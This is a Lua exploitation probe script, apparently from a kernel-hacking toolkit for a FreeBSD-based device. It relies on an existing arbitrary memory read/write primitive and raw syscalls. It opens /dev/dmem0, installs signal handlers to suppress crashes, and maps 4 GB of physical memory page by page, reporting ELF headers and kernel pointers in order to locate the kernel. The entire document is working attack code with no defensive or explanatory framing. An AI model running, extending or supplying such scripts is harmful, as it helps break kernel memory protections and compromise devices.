-- CRASH_CLASS: LOW
-- PROBE 528s: Ultra-light kernel scan — 1 page per 1 MiB
--
-- Map 1 page (16KB), read 1 dword + 1 qword, munmap. Per MiB.
-- 3 syscalls + 2 reads per iteration. 4096 iterations for 4 GB.
-- Look for: ELF magic (0x464C457F) and kernel pointers (hi32 in FFFF8xxx).

print("=== PROBE 528s: ULTRALIGHT SCAN ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local fd = N(native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0)))
print("fd=" .. fd)
if fd < 0 or fd > 200 then print("BAD"); return end

local sc_477 = mk(477)
local sc_73 = mk(73)
local PAGE = 0x4000
local MIB = 0x100000

local elfs = {}
local kptrs = {}
local fails = 0
local scanned = 0

-- Scan 0 to 4 GB in 1 MiB steps
for i = 0, 4095 do
    local off = i * MIB
    local hi = math.floor(off / 0x100000000)
    local lo = off % 0x100000000
    local phys = uint64(string.format("0x%X%08X", hi, lo))

    local ok_m, rv = pcall(function()
        return sc_477(uint64(0), uint64(PAGE), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if not ok_m or not rv then fails = fails + 1
    else
        local rh, rl = get_hi_lo(rv)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh == 0xFFFFFFFF then
            fails = fails + 1
        else
            scanned = scanned + 1
            local va = N(rv)

            -- Check ELF magic
            local d = rd(va)
            if d then
                if d < 0 then d = d + 0x100000000 end
                if d == 0x464C457F then
                    table.insert(elfs, off)
                    print(string.format("ELF @ phys 0x%X", off))
                end
            end

            -- Check kernel pointer
            local q = rq(va)
            if q then
                local vh, vl = get_hi_lo(q)
                if vh < 0 then vh = vh + 0x100000000 end
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    table.insert(kptrs, {off, vh, vl})
                    if #kptrs <= 30 then
                        print(string.format("KPTR @ phys 0x%X = 0x%08X%08X", off, vh, vl))
                    end
                end
            end

            pcall(function() sc_73(rv, uint64(PAGE)) end)
        end
    end
end

print("")
print("scanned=" .. scanned .. " fails=" .. fails)
print("ELFs=" .. #elfs)
for _, e in ipairs(elfs) do print(string.format("  0x%X", e)) end
print("KPTRs=" .. #kptrs)
if #kptrs > 0 then
    table.sort(kptrs, function(a, b) return a[1] < b[1] end)
    for i = 1, math.min(30, #kptrs) do
        local k = kptrs[i]
        print(string.format("  0x%X: 0x%08X%08X", k[1], k[2], k[3]))
    end
end
print("=== 528s DONE ===")
